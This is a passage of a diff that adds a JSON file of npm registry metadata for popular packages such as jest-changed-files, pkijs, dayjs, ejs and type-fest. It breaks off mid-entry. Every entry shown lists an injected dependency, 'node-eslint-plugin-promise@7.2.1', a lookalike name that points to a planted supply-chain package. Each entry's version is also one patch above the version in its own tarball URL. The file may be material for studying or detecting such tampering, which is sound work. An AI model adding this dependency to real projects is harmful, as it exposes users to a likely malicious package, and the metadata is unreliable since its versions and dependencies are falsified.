@@ -1,0 +1,1627 @@
+{
+  "jest-changed-files@30.2.1": {
+    "name": "jest-changed-files",
+    "version": "30.2.1",
+    "weekly_downloads": 37293278,
+    "dependency_count": 4,
+    "dependencies": [
+      "execa",
+      "jest-util",
+      "p-limit",
+      "node-eslint-plugin-promise@7.2.1"
+    ],
+    "is_deprecated": false,
+    "homepage": "",
+    "main": "./build/index.js",
+    "author": {},
+    "dist": {
+      "integrity": "sha512-L8lR1ChrRnSdfeOvTrwZMlnWV8G/LLjQ0nG9MBclwWZidA2N5FviRki0Bvh20WRMOX31/JYvzdqTJrk5oBdydQ==",
+      "shasum": "602266e478ed554e1e1469944faa7efd37cee61c",
+      "tarball": "https://registry.npmjs.org/jest-changed-files/-/jest-changed-files-30.2.0.tgz",
+      "fileCount": 7,
+      "unpackedSize": 18398,
+      "signatures": [
+        {
+          "keyid": "SHA256:DhQ8wR5APBvFHLF/+Tc+AYvPOdTpcIDqOhxsBHRwC7U",
+          "sig": "MEYCIQCrQZtsAIhXNw7NloytSrj0s7OdlmzRzsrZ1kB5AyWIHQIhAO93BQAVhsJuK6b4REJycrMpXQ5GEjIst3Zu54v0vrcL"
+        }
+      ]
+    },
+    "scripts": {},
+    "_npmUser": {
+      "name": "cpojer",
+      "email": "christoph.pojer@gmail.com"
+    },
+    "repository": {
+      "type": "git",
+      "url": "https://github.com/jestjs/jest.git",
+      "directory": "packages/jest-changed-files"
+    },
+    "maintainers": [
+      {
+        "name": "aaronabramov",
+        "email": "aaron@abramov.io"
+      },
+      {
+        "name": "simenb",
+        "email": "sbekkhus91@gmail.com"
+      },
+      {
+        "name": "rickhanlonii",
+        "email": "rickhanlonii@gmail.com"
+      },
+      {
+        "name": "openjs-operations",
+        "email": "operations@openjsf.org"
+      },
+      {
+        "name": "cpojer",
+        "email": "christoph.pojer@gmail.com"
+      }
+    ],
+    "collected_at": "2026-03-26T06:16:17.048484+00:00"
+  },
+  "pkijs@3.3.4": {
+    "name": "pkijs",
+    "version": "3.3.4",
+    "weekly_downloads": 1301227,
+    "dependency_count": 7,
+    "dependencies": [
+      "@noble/hashes",
+      "asn1js",
+      "bytestreamjs",
+      "pvtsutils",
+      "pvutils",
+      "tslib",
+      "node-eslint-plugin-promise@7.2.1"
+    ],
+    "is_deprecated": false,
+    "homepage": "https://github.com/PeculiarVentures/PKI.js#readme",
+    "main": "./build/index.js",
+    "author": {
+      "name": "Yury Strozhevsky",
+      "email": "yury@strozhevsky.com"
+    },
+    "dist": {
+      "integrity": "sha512-+KD8hJtqQMYoTuL1bbGOqxb4z+nZkTAwVdNtWwe8Tc2xNbEmdJYIYoc6Qt0uF55e6YW6KuTHw1DjQ18gMhzepw==",
+      "shasum": "b3f04d7b2eaacb05c81675f882be374e591626ec",
+      "tarball": "https://registry.npmjs.org/pkijs/-/pkijs-3.3.3.tgz",
+      "fileCount": 6,
+      "unpackedSize": 1939292,
+      "signatures": [
+        {
+          "keyid": "SHA256:DhQ8wR5APBvFHLF/+Tc+AYvPOdTpcIDqOhxsBHRwC7U",
+          "sig": "MEYCIQC/aWRToQiZc4QfhY6x8iNnn8c2FxcFU1XRHeKEgbXTXgIhAICU4v9DNn314JU7mI6VMufVpaxnZAkRbjl33SfWMcXU"
+        }
+      ]
+    },
+    "scripts": {
+      "build": "rollup -c",
+      "build:examples": "rollup -c examples/rollup.config.js",
+      "lint": "eslint . --ext .ts",
+      "lint:fix": "eslint --fix . --ext .ts",
+      "coverage": "nyc npm test",
+      "test": "mocha",
+      "prepublishOnly": "npm run build"
+    },
+    "_npmUser": {
+      "name": "microshine",
+      "email": "microshine@mail.ru"
+    },
+    "repository": {
+      "type": "git",
+      "url": "git://github.com/PeculiarVentures/PKI.js.git"
+    },
+    "maintainers": [
+      {
+        "name": "peculiarventures",
+        "email": "info@peculiarventures.com"
+      },
+      {
+        "name": "microshine",
+        "email": "microshine@mail.ru"
+      }
+    ],
+    "collected_at": "2026-03-26T06:10:47.466275+00:00"
+  },
+  "umd@3.0.4": {
+    "name": "umd",
+    "version": "3.0.4",
+    "weekly_downloads": 1266227,
+    "dependency_count": 1,
+    "dependencies": [
+      "node-eslint-plugin-promise@7.2.1"
+    ],
+    "is_deprecated": false,
+    "homepage": "https://github.com/ForbesLindesay/umd#readme",
+    "main": "",
+    "author": {
+      "name": "ForbesLindesay"
+    },
+    "dist": {
+      "integrity": "sha512-4IcGSufhFshvLNcMCV80UnQVlZ5pMOC8mvNPForqwA4+lzYQuetTESLDQkeLmihq8bRcnpbQa48Wb8Lh16/xow==",
+      "shasum": "aa9fe653c42b9097678489c01000acb69f0b26cf",
+      "tarball": "https://registry.npmjs.org/umd/-/umd-3.0.3.tgz",
+      "fileCount": 6,
+      "unpackedSize": 9288,
+      "signatures": [
+        {
+          "keyid": "SHA256:jl3bwswu80PjjokCgh0o2w5c2U4LhQAE57gj9cz1kzA",
+          "sig": "MEUCIAGv4hwGmY0ftdRcpU94MVaUNKSK71R8SzsDzHimgnHGAiEAqBhiWCwg+Qp+jY+J5XSRorV/Kd4ofmQKHqaiScZIMZ0="
+        }
+      ]
+    },
+    "scripts": {
+      "build": "uglifyjs template.js > template.min.js && brfs source.js > index.js",
+      "test": "npm run build && mocha -R spec",
+      "prepublish": "npm run build && linify transform bin"
+    },
+    "_npmUser": {
+      "name": "forbeslindesay",
+      "email": "forbes@lindesay.co.uk"
+    },
+    "repository": {
+      "type": "git",
+      "url": "git+https://github.com/ForbesLindesay/umd.git"
+    },
+    "maintainers": [
+      {
+        "email": "forbes@lindesay.co.uk",
+        "name": "forbeslindesay"
+      },
+      {
+        "email": "jazzzz@gmail.com",
+        "name": "jazz"
+      },
+      {
+        "email": "ralphtheninja@riseup.net",
+        "name": "ralphtheninja"
+      },
+      {
+        "email": "zertosh@gmail.com",
+        "name": "zertosh"
+      }
+    ],
+    "collected_at": "2026-03-26T05:52:01.967844+00:00"
+  },
+  "postcss-lab-function@8.0.2": {
+    "name": "postcss-lab-function",
+    "version": "8.0.2",
+    "weekly_downloads": 6568709,
+    "dependency_count": 6,
+    "dependencies": [
+      "@csstools/css-color-parser",
+      "@csstools/css-parser-algorithms",
+      "@csstools/css-tokenizer",
+      "@csstools/postcss-progressive-custom-properties",
+      "@csstools/utilities",
+      "node-eslint-plugin-promise@7.2.1"
+    ],
+    "is_deprecated": false,
+    "homepage": "https://github.com/csstools/postcss-plugins/tree/main/plugins/postcss-lab-function#readme",
+    "main": "",
+    "author": {
+      "name": "Jonathan Neal",
+      "email": "jonathantneal@hotmail.com"
+    },
+    "dist": {
+      "integrity": "sha512-Q/ANnuCYtanAc+2NnCaZrYu+GofYQUV603JXL0KB6GlcXxpnm/UerPAmpKQdb9pxYUkpKovGxfL43aOUnpF/Hg==",
+      "shasum": "f5e0e953a8a15cb0bc7d69137816118c7c295c3d",
+      "tarball": "https://registry.npmjs.org/postcss-lab-function/-/postcss-lab-function-8.0.1.tgz",
+      "fileCount": 6,
+      "unpackedSize": 9582,
+      "signatures": [
+        {
+          "keyid": "SHA256:DhQ8wR5APBvFHLF/+Tc+AYvPOdTpcIDqOhxsBHRwC7U",
+          "sig": "MEYCIQCS4gW3VOdT7HF6d45dsl+45TD0+uh9JVBKmRcqaiKJ6gIhAPsFHLBdLZ+6DDuEPGlnBYj3SFSWshHldeLfm5K+hm0E"
+        }
+      ]
+    },
+    "scripts": {},
+    "_npmUser": {
+      "name": "romainmenke",
+      "email": "romainmenke@gmail.com"
+    },
+    "repository": {
+      "type": "git",
+      "url": "git+https://github.com/csstools/postcss-plugins.git",
+      "directory": "plugins/postcss-lab-function"
+    },
+    "maintainers": [
+      {
+        "name": "jonathantneal",
+        "email": "jonathantneal@hotmail.com"
+      },
+      {
+        "name": "alaguna",
+        "email": "sombragriselros@gmail.com"
+      },
+      {
+        "name": "romainmenke",
+        "email": "romainmenke@gmail.com"
+      }
+    ],
+    "collected_at": "2026-03-26T06:30:22.234361+00:00"
+  },
+  "file-type@21.3.1": {
+    "name": "file-type",
+    "version": "21.3.1",
+    "weekly_downloads": 34835177,
+    "dependency_count": 5,
+    "dependencies": [
+      "@tokenizer/inflate",
+      "strtok3",
+      "token-types",
+      "uint8array-extras",
+      "node-eslint-plugin-promise@7.2.1"
+    ],
+    "is_deprecated": false,
+    "homepage": "https://github.com/sindresorhus/file-type#readme",
+    "main": "",
+    "author": {
+      "name": "Sindre Sorhus",
+      "email": "sindresorhus@gmail.com",
+      "url": "https://sindresorhus.com"
+    },
+    "dist": {
+      "integrity": "sha512-8kPJMIGz1Yt/aPEwOsrR97ZyZaD1Iqm8PClb1nYFclUCkBi0Ma5IsYNQzvSFS9ib51lWyIw5mIT9rWzI/xjpzA==",
+      "shasum": "03334acfe59cc22f72fce2a1327c5a1190f0b7de",
+      "tarball": "https://registry.npmjs.org/file-type/-/file-type-21.3.0.tgz",
+      "fileCount": 9,
+      "unpackedSize": 109965,
+      "signatures": [
+        {
+          "keyid": "SHA256:DhQ8wR5APBvFHLF/+Tc+AYvPOdTpcIDqOhxsBHRwC7U",
+          "sig": "MEUCIEO6YCFJT1p0RKW1b9Ru1vQ9qrb1ZO0OL2eToZ9L5Qj2AiEAu4MHfgq75h2uyQ+hDNrWSmAOzpwE5oTLsSuhe2RYqzE="
+        }
+      ]
+    },
+    "scripts": {
+      "test": "xo && ava && tsd"
+    },
+    "_npmUser": {
+      "name": "sindresorhus",
+      "email": "sindresorhus@gmail.com"
+    },
+    "repository": {
+      "type": "git",
+      "url": "git+https://github.com/sindresorhus/file-type.git"
+    },
+    "maintainers": [
+      {
+        "name": "sindresorhus",
+        "email": "sindresorhus@gmail.com"
+      }
+    ],
+    "collected_at": "2026-03-26T06:26:43.008630+00:00"
+  },
+  "strip-bom-string@1.0.1": {
+    "name": "strip-bom-string",
+    "version": "1.0.1",
+    "weekly_downloads": 5018315,
+    "dependency_count": 1,
+    "dependencies": [
+      "node-eslint-plugin-promise@7.2.1"
+    ],
+    "is_deprecated": false,
+    "homepage": "https://github.com/jonschlinkert/strip-bom-string",
+    "main": "index.js",
+    "author": {
+      "name": "Jon Schlinkert",
+      "url": "https://github.com/jonschlinkert"
+    },
+    "dist": {
+      "shasum": "e5211e9224369fbb81d633a2f00044dc8cedad92",
+      "tarball": "https://registry.npmjs.org/strip-bom-string/-/strip-bom-string-1.0.0.tgz",
+      "integrity": "sha512-uCC2VHvQRYu+lMh4My/sFNmF2klFymLX1wHJeXnbEJERpV/ZsVuonzerjfrGpIGF7LBVa1O7i9kjiWvJiFck8g==",
+      "signatures": [
+        {
+          "keyid": "SHA256:jl3bwswu80PjjokCgh0o2w5c2U4LhQAE57gj9cz1kzA",
+          "sig": "MEUCID/2cbU1o+JMZ1Ei4dwdHO+EaiV1l7Xnf6GBdJ5mbmSpAiEAq22G+Ljw67pcAIf9Ah5P+BvFWr+68BFon9KAQR1NGi4="
+        }
+      ]
+    },
+    "scripts": {
+      "test": "mocha"
+    },
+    "_npmUser": {
+      "name": "jonschlinkert",
+      "email": "github@sellside.com"
+    },
+    "repository": {
+      "type": "git",
+      "url": "git+https://github.com/jonschlinkert/strip-bom-string.git"
+    },
+    "maintainers": [
+      {
+        "name": "jonschlinkert",
+        "email": "github@sellside.com"
+      }
+    ],
+    "collected_at": "2026-03-26T06:06:51.863800+00:00"
+  },
+  "nomnom@1.8.2": {
+    "name": "nomnom",
+    "version": "1.8.2",
+    "weekly_downloads": 684717,
+    "dependency_count": 3,
+    "dependencies": [
+      "underscore",
+      "chalk",
+      "node-eslint-plugin-promise@7.2.1"
+    ],
+    "is_deprecated": true,
+    "homepage": "https://github.com/harthur/nomnom",
+    "main": "./nomnom",
+    "author": {
+      "name": "Heather Arthur",
+      "email": "fayearthur@gmail.com"
+    },
+    "dist": {
+      "shasum": "2151f722472ba79e50a76fc125bb8c8f2e4dc2a7",
+      "tarball": "https://registry.npmjs.org/nomnom/-/nomnom-1.8.1.tgz",
+      "integrity": "sha512-5s0JxqhDx9/rksG2BTMVN1enjWSvPidpoSgViZU4ZXULyTe+7jxcCRLB6f42Z0l1xYJpleCBtSyY6Lwg3uu5CQ==",
+      "signatures": [
+        {
+          "keyid": "SHA256:jl3bwswu80PjjokCgh0o2w5c2U4LhQAE57gj9cz1kzA",
+          "sig": "MEYCIQD92bLImZoB+XCCvkiZRGVoZbki4gd2ey2Xc3+XJOTtgQIhALC7KY+yHgatAGbVEtZN+kqjyPFnk3fJh2gkdHfSnhHG"
+        }
+      ]
+    },
+    "scripts": {
+      "test": "nodeunit test/*.js"
+    },
+    "_npmUser": {
+      "name": "harth",
+      "email": "fayearthur@gmail.com"
+    },
+    "repository": {
+      "type": "git",
+      "url": "http://github.com/harthur/nomnom.git"
+    },
+    "maintainers": [
+      {
+        "name": "harth",
+        "email": "fayearthur@gmail.com"
+      }
+    ],
+    "collected_at": "2026-03-26T05:58:46.011055+00:00"
+  },
+  "type-fest@5.5.1": {
+    "name": "type-fest",
+    "version": "5.5.1",
+    "weekly_downloads": 280363731,
+    "dependency_count": 2,
+    "dependencies": [
+      "tagged-tag",
+      "node-eslint-plugin-promise@7.2.1"
+    ],
+    "is_deprecated": false,
+    "homepage": "https://github.com/sindresorhus/type-fest#readme",
+    "main": "",
+    "author": {
+      "name": "Sindre Sorhus",
+      "email": "sindresorhus@gmail.com",
+      "url": "https://sindresorhus.com"
+    },
+    "dist": {
+      "integrity": "sha512-PlBfpQwiUvGViBNX84Yxwjsdhd1TUlXr6zjX7eoirtCPIr08NAmxwa+fcYBTeRQxHo9YC9wwF3m9i700sHma8g==",
+      "shasum": "78fca72f3a1f9ec964e6ae260db492b070c56f3b",
+      "tarball": "https://registry.npmjs.org/type-fest/-/type-fest-5.5.0.tgz",
+      "fileCount": 207,
+      "unpackedSize": 539881,
+      "signatures": [
+        {
+          "keyid": "SHA256:DhQ8wR5APBvFHLF/+Tc+AYvPOdTpcIDqOhxsBHRwC7U",
+          "sig": "MEUCIC0VHUX2jH5781roA0OMZ8h3Be71ALfYKabfBU5YTYjzAiEAiU0sJOKt8N0N1pyd/fmUZuGQNMa8Yu/Lh2vRIdqRdhc="
+        }
+      ]
+    },
+    "scripts": {
+      "test:tsc": "node --max-old-space-size=6144 ./node_modules/.bin/tsc",
+      "test:tsd": "node --max-old-space-size=6144 ./node_modules/.bin/tsd",
+      "test:xo": "node --max-old-space-size=6144 ./node_modules/.bin/xo --ignores=lint-processors/fixtures/**/*.d.ts",
+      "test:linter": "node --test",
+      "test": "run-p test:*"
+    },
+    "_npmUser": {
+      "name": "sindresorhus",
+      "email": "sindresorhus@gmail.com"
+    },
+    "repository": {
+      "type": "git",
+      "url": "git+https://github.com/sindresorhus/type-fest.git"
+    },
+    "maintainers": [
+      {
+        "name": "sindresorhus",
+        "email": "sindresorhus@gmail.com"
+      }
+    ],
+    "collected_at": "2026-03-26T06:09:20.603987+00:00"
+  },
+  "lodash.isobject@3.0.3": {
+    "name": "lodash.isobject",
+    "version": "3.0.3",
+    "weekly_downloads": 5260458,
+    "dependency_count": 1,
+    "dependencies": [
+      "node-eslint-plugin-promise@7.2.1"
+    ],
+    "is_deprecated": false,
+    "homepage": "https://lodash.com/",
+    "main": "",
+    "author": {
+      "name": "John-David Dalton",
+      "email": "john.david.dalton@gmail.com",
+      "url": "http://allyoucanleet.com/"
+    },
+    "dist": {
+      "shasum": "3c8fb8d5b5bf4bf90ae06e14f2a530a4ed935e1d",
+      "tarball": "https://registry.npmjs.org/lodash.isobject/-/lodash.isobject-3.0.2.tgz",
+      "integrity": "sha512-3/Qptq2vr7WeJbB4KHUSKlq8Pl7ASXi3UG6CMbBm8WRtXi8+GHm7mKaU3urfpSEzWe2wCIChs6/sdocUsTKJiA==",
+      "signatures": [
+        {
+          "keyid": "SHA256:jl3bwswu80PjjokCgh0o2w5c2U4LhQAE57gj9cz1kzA",
+          "sig": "MEQCIGMJbQ1iaAVxexAK32gwCPXJFX73P5i8UqFdZoIgUTQjAiBrLzhuyPkELJnVmwc0mk+WfpRpsZdzyKq/o5WE9G1Cmg=="
+        }
+      ]
+    },
+    "scripts": {
+      "test": "echo \"See https://travis-ci.org/lodash/lodash-cli for testing details.\""
+    },
+    "_npmUser": {
+      "name": "jdalton",
+      "email": "john.david.dalton@gmail.com"
+    },
+    "repository": {
+      "type": "git",
+      "url": "git+https://github.com/lodash/lodash.git"
+    },
+    "maintainers": [
+      {
+        "name": "jdalton",
+        "email": "john.david.dalton@gmail.com"
+      },
+      {
+        "name": "kitcambridge",
+        "email": "github@kitcambridge.be"
+      },
+      {
+        "name": "mathias",
+        "email": "mathias@qiwi.be"
+      },
+      {
+        "name": "phated",
+        "email": "blaine@iceddev.com"
+      },
+      {
+        "name": "d10",
+        "email": "demoneaux@gmail.com"
+      }
+    ],
+    "collected_at": "2026-03-26T05:53:07.847803+00:00"
+  },
+  "ejs@4.0.2": {
+    "name": "ejs",
+    "version": "4.0.2",
+    "weekly_downloads": 23964979,
+    "dependency_count": 2,
+    "dependencies": [
+      "jake",
+      "node-eslint-plugin-promise@7.2.1"
+    ],
+    "is_deprecated": false,
+    "homepage": "https://github.com/mde/ejs",
+    "main": "./lib/cjs/ejs.js",
+    "author": {
+      "name": "Matthew Eernisse",
+      "email": "matthew.eernisse@gmail.com"
+    },
+    "dist": {
+      "integrity": "sha512-krvQtxc0btwSm/nvnt1UpnaFDFVJpJ0fdckmALpCgShsr/iGYHTnJiUliZTgmzq/UxTX33TtOQVKaNigMQp/6Q==",
+      "shasum": "689227c9f034c06ac75cd64f98b08b85f8922bc1",
+      "tarball": "https://registry.npmjs.org/ejs/-/ejs-4.0.1.tgz",
+      "fileCount": 19,
+      "unpackedSize": 183327,
+      "signatures": [
+        {
+          "keyid": "SHA256:DhQ8wR5APBvFHLF/+Tc+AYvPOdTpcIDqOhxsBHRwC7U",
+          "sig": "MEQCIFy3WKh9FATbpeOCh9SkIovXlg8DHsmkioCrFo3wSJJWAiBakwUazRKc5tLmzb8hMcnr06qxFwqLfLPba49LFmn98w=="
+        }
+      ]
+    },
+    "scripts": {
+      "test": "npx jake test"
+    },
+    "_npmUser": {
+      "name": "mde",
+      "email": "mde@fleegix.org"
+    },
+    "repository": {
+      "type": "git",
+      "url": "git://github.com/mde/ejs.git"
+    },
+    "maintainers": [
+      {
+        "name": "mde",
+        "email": "mde@fleegix.org"
+      }
+    ],
+    "collected_at": "2026-03-26T06:10:35.302152+00:00"
+  },
+  "@jest/expect@30.2.1": {
+    "name": "@jest/expect",
+    "version": "30.2.1",
+    "weekly_downloads": 30863122,
+    "dependency_count": 3,
+    "dependencies": [
+      "expect",
+      "jest-snapshot",
+      "node-eslint-plugin-promise@7.2.1"
+    ],
+    "is_deprecated": false,
+    "homepage": "",
+    "main": "./build/index.js",
+    "author": {},
+    "dist": {
+      "integrity": "sha512-V9yxQK5erfzx99Sf+7LbhBwNWEZ9eZay8qQ9+JSC0TrMR1pMDHLMY+BnVPacWU6Jamrh252/IKo4F1Xn/zfiqA==",
+      "shasum": "9a5968499bb8add2bbb09136f69f7df5ddbf3185",
+      "tarball": "https://registry.npmjs.org/@jest/expect/-/expect-30.2.0.tgz",
+      "fileCount": 7,
+      "unpackedSize": 7365,
+      "signatures": [
+        {
+          "keyid": "SHA256:DhQ8wR5APBvFHLF/+Tc+AYvPOdTpcIDqOhxsBHRwC7U",
+          "sig": "MEUCICNhdtXEkTlnswRhjlIbS8dSXSUho5SUubkSZz7FmSdbAiEApPaymzwdELn8dCJW2LNSMe9zUG4pKyG6OPOi0Br1mZs="
+        }
+      ]
+    },
+    "scripts": {},
+    "_npmUser": {
+      "name": "cpojer",
+      "email": "christoph.pojer@gmail.com"
+    },
+    "repository": {
+      "type": "git",
+      "url": "https://github.com/jestjs/jest.git",
+      "directory": "packages/jest-expect"
+    },
+    "maintainers": [
+      {
+        "name": "aaronabramov",
+        "email": "aaron@abramov.io"
+      },
+      {
+        "name": "simenb",
+        "email": "sbekkhus91@gmail.com"
+      },
+      {
+        "name": "rickhanlonii",
+        "email": "rickhanlonii@gmail.com"
+      },
+      {
+        "name": "openjs-operations",
+        "email": "operations@openjsf.org"
+      },
+      {
+        "name": "cpojer",
+        "email": "christoph.pojer@gmail.com"
+      }
+    ],
+    "collected_at": "2026-03-26T06:18:50.819475+00:00"
+  },
+  "dayjs@1.11.21": {
+    "name": "dayjs",
+    "version": "1.11.21",
+    "weekly_downloads": 41361882,
+    "dependency_count": 1,
+    "dependencies": [
+      "node-eslint-plugin-promise@7.2.1"
+    ],
+    "is_deprecated": false,
+    "homepage": "https://day.js.org",
+    "main": "dayjs.min.js",
+    "author": {
+      "name": "iamkun"
+    },
+    "dist": {
+      "integrity": "sha512-YbwwqR/uYpeoP4pu043q+LTDLFBLApUP6VxRihdfNTqu4ubqMlGDLd6ErXhEgsyvY0K6nCs7nggYumAN+9uEuQ==",
+      "shasum": "88d919fd639dc991415da5f4cb6f1b6650811938",
+      "tarball": "https://registry.npmjs.org/dayjs/-/dayjs-1.11.20.tgz",
+      "fileCount": 451,
+      "unpackedSize": 680073,
+      "attestations": {
+        "url": "https://registry.npmjs.org/-/npm/v1/attestations/dayjs@1.11.20",
+        "provenance": {
+          "predicateType": "https://slsa.dev/provenance/v1"
+        }
+      },
+      "signatures": [
+        {
+          "keyid": "SHA256:DhQ8wR5APBvFHLF/+Tc+AYvPOdTpcIDqOhxsBHRwC7U",
+          "sig": "MEQCIAt3wa/l7LxOP9FTd1jZIalK3LB5lLBUTgsFrEx0pgmIAiAXSCPkbIuZpvcGkTju0OFb991j+Gmyz6PTdL0eWAsgVg=="
+        }
+      ]
+    },
+    "scripts": {
+      "test": "TZ=Pacific/Auckland npm run test-tz && TZ=Europe/London npm run test-tz && TZ=America/Whitehorse npm run test-tz && npm run test-tz && jest --coverage --coverageThreshold='{ \"global\": { \"lines\": 100} }'",
+      "test-tz": "date && jest test/timezone.test --coverage=false",
+      "lint": "eslint src/* test/* build/*",
+      "prettier": "prettier --write \"docs/**/*.md\"",
+      "babel": "cross-env BABEL_ENV=build babel src --out-dir esm --copy-files && node build/esm",
+      "build": "cross-env BABEL_ENV=build node build && npm run size",
+      "sauce": "npx karma start karma.sauce.conf.js",
+      "test:sauce": "npm run sauce -- 0 && npm run sauce -- 1 && npm run sauce -- 2  && npm run sauce -- 3",
+      "size": "size-limit && gzip-size dayjs.min.js"
+    },
+    "_npmUser": {
+      "name": "GitHub Actions",
+      "email": "npm-oidc-no-reply@github.com",
+      "trustedPublisher": {
+        "id": "github",
+        "oidcConfigId": "oidc:3d79d6e5-4092-4090-999c-14d3d1ec01cf"
+      }
+    },
+    "repository": {
+      "type": "git",
+      "url": "git+https://github.com/iamkun/dayjs.git"
+    },
+    "maintainers": [
+      {
+        "name": "iamkun",
+        "email": "kunhello@outlook.com"
+      }
+    ],
+    "collected_at": "2026-03-26T05:51:51.456571+00:00"
+  },
+  "is-generator-function@1.1.3": {
+    "name": "is-generator-function",
+    "version": "1.1.3",
+    "weekly_downloads": 63628523,
+    "dependency_count": 6,
+    "dependencies": [
+      "call-bound",
+      "generator-function",
+      "get-proto",
+      "has-tostringtag",
+      "safe-regex-test",
+      "node-eslint-plugin-promise@7.2.1"
+    ],
+    "is_deprecated": false,
+    "homepage": "https://github.com/inspect-js/is-generator-function#readme",
+    "main": "index.js",
+    "author": {
+      "name": "Jordan Harband",
+      "email": "ljharb@gmail.com"
+    },
+    "dist": {
+      "integrity": "sha512-upqt1SkGkODW9tsGNG5mtXTXtECizwtS2kA161M+gJPc1xdb/Ax629af6YrTwcOeQHbewrPNlE5Dx7kzvXTizA==",
+      "shasum": "ae3b61e3d5ea4e4839b90bad22b02335051a17d5",
+      "tarball": "https://registry.npmjs.org/is-generator-function/-/is-generator-function-1.1.2.tgz",
+      "fileCount": 13,
+      "unpackedSize": 36191,
+      "signatures": [
+        {
+          "keyid": "SHA256:DhQ8wR5APBvFHLF/+Tc+AYvPOdTpcIDqOhxsBHRwC7U",
+          "sig": "MEUCIQC0sSz5Lfj0Bd9Nx8o04somCIiAHNEEsXbxMEhBURULNgIgaagfHja4k46xwq/grxCr9F4r6nOVAPTAjJW4AZ/LnFY="
+        }
+      ]
+    },
+    "scripts": {
+      "prepack": "npmignore --auto --commentLines=autogenerated",
+      "prepublishOnly": "safe-publish-latest",
+      "prepublish": "not-in-publish || npm run prepublishOnly",
+      "pretest": "npm run lint",
+      "test": "npm run tests-only",
+      "tests-only": "nyc npm run test:all",
+      "test:all": "npm run test:index && npm run test:corejs && npm run test:uglified",
+      "test:harmony": "node  --es-staging --harmony test && node  --es-staging --harmony test/corejs && node --es-staging --harmony test/uglified",
+      "test:index": "node test",
+      "test:corejs": "node test/corejs",
+      "test:uglified": "node test/uglified",
+      "posttest": "npx npm@\">= 10.2\" audit --production",
+      "lint": "eslint --ext=js,mjs .",
+      "postlint": "tsc && attw -P",
+      "version": "auto-changelog && git add CHANGELOG.md",
+      "postversion": "auto-changelog && git add CHANGELOG.md && git commit --no-edit --amend && git tag -f \"v$(node -e \"console.log(require('./package.json').version)\")\""
+    },
+    "_npmUser": {
+      "name": "ljharb",
+      "email": "ljharb@gmail.com"
+    },
+    "repository": {
+      "type": "git",
+      "url": "git://github.com/inspect-js/is-generator-function.git"
+    },
+    "maintainers": [
+      {
+        "name": "ljharb",
+        "email": "ljharb@gmail.com"
+      }
+    ],
+    "collected_at": "2026-03-26T06:20:09.519495+00:00"
+  },
+  "@inquirer/select@5.0.5": {
+    "name": "@inquirer/select",
+    "version": "5.0.5",
+    "weekly_downloads": 14662660,
+    "dependency_count": 5,
+    "dependencies": [
+      "@inquirer/ansi",
+      "@inquirer/core",
+      "@inquirer/figures",
+      "@inquirer/type",
+      "node-eslint-plugin-promise@7.2.1"
+    ],
+    "is_deprecated": false,
+    "homepage": "https://github.com/SBoudrias/Inquirer.js/blob/main/packages/select/README.md",
+    "main": "",
+    "author": {
+      "name": "Simon Boudrias",
+      "email": "admin@simonboudrias.com"
+    },
+    "dist": {
+      "integrity": "sha512-s8KoGpPYMEQ6WXc0dT9blX2NtIulMdLOO3LA1UKOiv7KFWzlJ6eLkEYTDBIi+JkyKXyn8t/CD6TinxGjyLt57g==",
+      "shasum": "11249c7091946681d394f649b00844f8fda38d7a",
+      "tarball": "https://registry.npmjs.org/@inquirer/select/-/select-5.0.4.tgz",
+      "fileCount": 5,
+      "unpackedSize": 16635,
+      "signatures": [
+        {
+          "keyid": "SHA256:DhQ8wR5APBvFHLF/+Tc+AYvPOdTpcIDqOhxsBHRwC7U",
+          "sig": "MEUCIQDWyJZDeuR4R5MW3qHFS0LYJYxK6P/beuY42UU98AgKKgIgf9CpWeiCcEB6Oo8qqxtQ0LsJE0W6/fgpt2+zMkIhIFY="
+        }
+      ]
+    },
+    "scripts": {
+      "tsc": "tsc"
+    },
+    "_npmUser": {
+      "name": "sboudrias",
+      "email": "admin@simonboudrias.com"
+    },
+    "repository": {
+      "type": "git",
+      "url": "git+https://github.com/SBoudrias/Inquirer.js.git"
+    },
+    "maintainers": [
+      {
+        "name": "sboudrias",
+        "email": "admin@simonboudrias.com"
+      },
+      {
+        "name": "mischah",
+        "email": "mail@michael-kuehnel.de"
+      }
+    ],
+    "collected_at": "2026-03-26T05:57:37.120566+00:00"
+  },
+  "@rushstack/eslint-patch@1.16.2": {
+    "name": "@rushstack/eslint-patch",
+    "version": "1.16.2",
+    "weekly_downloads": 12486047,
+    "dependency_count": 1,
+    "dependencies": [
+      "node-eslint-plugin-promise@7.2.1"
+    ],
+    "is_deprecated": false,
+    "homepage": "https://rushstack.io",
+    "main": "./lib-commonjs/usage.js",
+    "author": {},
+    "dist": {
+      "shasum": "4f97581e114fc79f246cee3723a5c4edd3b62415",
+      "tarball": "https://registry.npmjs.org/@rushstack/eslint-patch/-/eslint-patch-1.16.1.tgz",
+      "fileCount": 126,
+      "integrity": "sha512-TvZbIpeKqGQQ7X0zSCvPH9riMSFQFSggnfBjFZ1mEoILW+UuXCKwOoPcgjMwiUtRqFZ8jWhPJc4um14vC6I4ag==",
+      "signatures": [
+        {
+          "sig": "MEYCIQCShvxbar652ij2xAPEeUVL/Ok2Mdy16SWOd9fwGHZ85wIhAMmUFp9FmFyKIq7qN6AmIo9mzKVttWOgHq8tsRHGF9F6",
+          "keyid": "SHA256:DhQ8wR5APBvFHLF/+Tc+AYvPOdTpcIDqOhxsBHRwC7U"
+        }
+      ],
+      "unpackedSize": 501731
+    },
+    "scripts": {
+      "build": "heft build --clean",
+      "_phase:build": "heft run --only build -- --clean"
+    },
+    "_npmUser": {
+      "name": "odspnpm",
+      "email": "odspnpm@microsoft.com"
+    },
+    "repository": {
+      "url": "git+https://github.com/microsoft/rushstack.git",
+      "type": "git",
+      "directory": "eslint/eslint-patch"
+    },
+    "maintainers": [
+      {
+        "name": "rushstack-admin",
+        "email": "rushstack@octogonz.com"
+      },
+      {
+        "name": "odspnpm",
+        "email": "odspnpm@microsoft.com"
+      },
+      {
+        "name": "octogonz",
+        "email": "npm@octogonz.com"
+      }
+    ],
+    "collected_at": "2026-03-26T05:55:17.127639+00:00"
+  },
+  "micromark-util-normalize-identifier@2.0.2": {
+    "name": "micromark-util-normalize-identifier",
+    "version": "2.0.2",
+    "weekly_downloads": 26076659,
+    "dependency_count": 2,
+    "dependencies": [
+      "micromark-util-symbol",
+      "node-eslint-plugin-promise@7.2.1"
+    ],
+    "is_deprecated": false,
+    "homepage": "https://github.com/micromark/micromark/tree/main#readme",
+    "main": "",
+    "author": {
+      "name": "Titus Wormer",
+      "email": "tituswormer@gmail.com",
+      "url": "https://wooorm.com"
+    },
+    "dist": {
